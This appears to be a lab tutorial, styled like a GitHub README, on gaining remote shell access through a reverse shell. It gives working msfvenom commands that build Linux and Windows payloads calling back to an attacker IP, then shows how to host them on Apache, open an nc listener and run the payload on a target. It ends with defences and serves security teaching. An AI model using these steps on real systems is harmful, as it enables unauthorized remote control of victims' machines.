# Gaining_Shell_Access_By_Reverse_Shell
## Reverse shell and its functionality:
A **reverse shell** attack occurs when an attacker gains unauthorized access to a target system by creating a malicious payload that causes the victim’s system to connect back to the attacker's machine. Unlike traditional attacks where the attacker directly connects to the victim, in a reverse shell, the victim's machine initiates the connection to the attacker. This allows the attacker to bypass network security measures, such as firewalls, that typically block incoming traffic. Once the reverse shell is executed on the victim machine, it opens a command-line interface that provides the attacker with control over the system. The attacker can then issue commands, execute malicious code, steal sensitive data, or install additional malware. Reverse shell attacks often exploit vulnerabilities in the target system's software, such as unpatched security flaws, and can be delivered through methods like phishing emails or malicious websites. Defenders must be vigilant by monitoring network traffic for unusual outbound connections and ensuring systems are regularly updated to close any vulnerabilities that could be exploited.

**How it works**
A **reverse shell** attack works by exploiting the connection flow between a compromised system and the attacker's machine. Here's a breakdown of how it works:
1. **Preparation:** The attacker creates a malicious payload, often using tools like msfvenom, which generates an executable file designed to establish a reverse connection from the victim's system to the attacker's machine. The payload is configured with the attacker's IP address and a specific port number that will be used to establish the connection.
2. **Delivery:** The attacker then delivers this payload to the target system, typically using social engineering tactics such as phishing emails, malicious attachments, or exploiting vulnerabilities in the victim’s software or web applications.
3. **Execution:** Once the victim executes the payload (which could be in the form of a script, executable, or file), the malicious code runs on the victim’s machine. This causes the victim’s system to initiate an outbound connection to the attacker's IP address and port, thus establishing a communication channel.
4. **Connection Established:** Upon connection, the attacker gains a shell or command-line interface that provides full control over the victim’s system. The attacker can now execute commands on the system as if they were sitting in front of it, allowing them to navigate directories, access files, install malware, or exfiltrate data.
5. **Persistence:** In some cases, attackers may set up the reverse shell to run persistently, meaning it reconnects if the victim’s system is rebooted or if the connection is severed. This allows for ongoing access to the system until it is detected and removed.


## Preparation
Create payload
Command for linux

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.104 LPORT=8080 -f elf > shell.elf
```

Command for Windows
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.104 LPORT=8080 -f exe > reverse.exe
```

Explanation
- **Payload:** Generates a reverse TCP shell for a Windows system.
- **LHOST:** Attacker's IP address is 192.168.1.104
- **LPORT:** Listening port is 8080
- **Output:** Saves the payload as shell.elf, reverse.exe.

![image](https://github.com/user-attachments/assets/87a44ee2-1750-45ad-9d7e-4999e5f1a9cc)



## Delivery
Since we are using a lab setup, so for delivery we will be hosting our server for target to downloading the payload.

Starting our apache server:
```
sudo systemctl start apache2
```

to check if the server is started or not:
```
sudo systemctl status apache2
```
![image](https://github.com/user-attachments/assets/e48c06dd-b079-4eed-b13c-82466115ab57)


Change the directory to server
```
cd var/www/html
```

![image](https://github.com/user-attachments/assets/117f5b75-aa3e-4fd9-b9e5-c5bb0ea9aa70)

Remove the index file

```
sudo rm -rf index.html
sudo rm -rf index.nginx-debian.html
```

![image](https://github.com/user-attachments/assets/7fe7fbc4-53c1-435b-a430-f85b2c45c175)

Now move the elf file and exe file
```
sudo mv /home/kali/Desktop/reverse.exe ./
sudo mv /home/kali/Desktop/shell.elf ./
```

Files should be visible in the web browser
![image](https://github.com/user-attachments/assets/0258d664-33f2-447f-8ce7-bda369bc0d4d)


Open listener
```
nc -lvnp 8080
```

![image](https://github.com/user-attachments/assets/fa1723da-9f13-4d19-9e42-f09d112d6de3)


**Goto target machine**

Open the server ip in web browser in target machine
![image](https://github.com/user-attachments/assets/a8784e6b-0334-450e-a411-0144177a5c53)

Download the elf file since our target machine is linux
Change the directory to Downloads
```
cd Downloads
```

Check the permissions for elf file
```
ls -l shell.elf
```
If it is not executable Give the executable permission to elf file.

```
chmod +x shell.elf
```

![image](https://github.com/user-attachments/assets/473ad2ab-2c4b-49f1-b88d-07c94ba33e32)


Execute the file
```
./shell.elf
```

```
bash shell.elf
```

## Connection Established
When the file is executed the connection is established between target machine and the host

![image](https://github.com/user-attachments/assets/2bfdee70-12d0-462c-a009-23a367b4a2d7)


We can check it by commands
Like whoami, pwd etc

![image](https://github.com/user-attachments/assets/a9e8f991-7c26-4a38-a990-8d338401f949)

![image](https://github.com/user-attachments/assets/109f5391-f52d-4d2d-8b12-f4ae78ac1f1f)


Also for testing we create file and directory
![image](https://github.com/user-attachments/assets/f16d7f3f-a376-4065-9c6e-998dfc94a39b)


## Defence against Reverse Shell
Defending against a **reverse shell** attack requires a multi-layered approach to network security, system hardening, and vigilant monitoring. Here are key strategies to prevent and mitigate reverse shell attacks:
1. **Network Segmentation and Firewalls:** One of the most effective defenses is to configure firewalls to block unauthorized outbound traffic. By limiting outgoing connections and ensuring that only necessary services can initiate connections, you can make it harder for a reverse shell to establish a connection to the attacker’s machine. Implement network segmentation to isolate critical systems, reducing the impact if a system is compromised.
2. **Intrusion Detection Systems (IDS) and Intrusion Prevention Systems (IPS):** Deploy IDS/IPS solutions to monitor and analyze network traffic for signs of suspicious activity, such as unusual outbound connections or unexpected ports being accessed. These systems can detect reverse shell traffic and trigger alerts or automatically block malicious connections.
3. **Endpoint Security:** Ensure that all systems are equipped with up-to-date antivirus, anti-malware software, and endpoint detection and response (EDR) solutions. These tools can help identify malicious payloads before they are executed and stop the reverse shell from gaining a foothold.
4. **Regular Patching and Software Updates:** Keeping software and systems patched is essential in closing vulnerabilities that could be exploited by reverse shell payloads. Attackers often leverage unpatched vulnerabilities in applications or operating systems to gain access to a system. Regularly updating software reduces the chances of such attacks succeeding.
5. **Least Privilege Principle:** Limit user privileges on systems to the minimum required for normal operations. By restricting the permissions of users and applications, even if a reverse shell is executed, the attacker will have limited access and may not be able to perform significant damage or exfiltrate sensitive data.
6. **Application Whitelisting:** Implement application whitelisting to restrict which applications can run on systems. This can prevent unauthorized payloads from executing, especially if they are delivered through malicious attachments or downloads.
7. **User Awareness and Training:** Educate users about the dangers of phishing, suspicious attachments, and malicious links. Social engineering is a common delivery method for reverse shell payloads, and awareness training can significantly reduce the risk of human error.
8. **Monitoring and Logging:** Continuously monitor and log all system and network activities to detect any abnormal behaviour indicative of a reverse shell. Look for patterns such as high outbound traffic, unexpected connections, or unfamiliar IP addresses. Logs should be analyzed regularly to spot potential breaches early.


# Conclusion
In conclusion, reverse shell attacks represent a significant threat in the realm of cybersecurity, enabling attackers to bypass traditional security defenses and gain unauthorized control over systems. By leveraging techniques such as malicious payload delivery and exploiting software vulnerabilities, attackers can establish covert communication channels with compromised systems, allowing them to execute commands and carry out malicious activities. Defending against reverse shell attacks requires a comprehensive approach, including network segmentation, strong endpoint security, regular patching, and the implementation of intrusion detection systems. Additionally, educating users on cybersecurity best practices and maintaining vigilant monitoring can help identify and prevent potential breaches. With these proactive defense strategies, organizations can significantly reduce the risk of reverse shell attacks and protect their critical systems and data from compromise.
